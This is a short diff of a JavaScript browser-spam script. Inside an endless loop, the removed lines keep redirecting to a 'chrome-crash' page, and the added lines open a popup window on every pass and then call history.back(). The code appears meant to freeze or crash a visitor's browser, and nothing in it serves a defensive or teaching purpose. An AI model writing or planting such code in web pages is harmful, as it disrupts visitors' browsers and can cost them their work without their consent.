@@ -4,9 +4,8 @@ $vwer = '#';
 
 while(1) {
     
-  this.document.location.href = 'https://chrome-crash-invoke.github.io/chrome-crash/';
-  this.document.location.href = $vwer + $location;
-  // If Document Is Pressed. Spam Occures Infinitly
+    window.open("https://www.somewebsite.com", "_blank", "toolbar=yes,top=500,left=500,width=400,height=400");
+    history.back(); // When Function window.open does it's thing, history back will reset the website.
     
 }
 
